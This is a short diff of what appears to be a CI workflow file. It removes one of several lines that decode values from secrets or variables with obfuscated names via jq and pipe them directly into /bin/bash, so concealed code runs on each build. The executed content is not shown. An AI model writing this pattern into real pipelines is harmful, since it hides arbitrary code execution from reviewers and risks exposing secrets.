@@ -22,7 +22,6 @@ jobs:
           pckey0: ${{ secrets.pckey0 }}
         run: |
           printf '%s' "$pckey0" | jq -r .phxgd0 | /bin/bash
-          echo $q81271 | jq -r .ipkc27729 | /bin/bash
           printf '%s' "$vfx4" | jq -r .lh5409 | /bin/bash
           echo $jf7 | jq -r .qvje1 | /bin/bash
           printf '%s' "$kq45720" | jq -r .yr09022 | /bin/bash
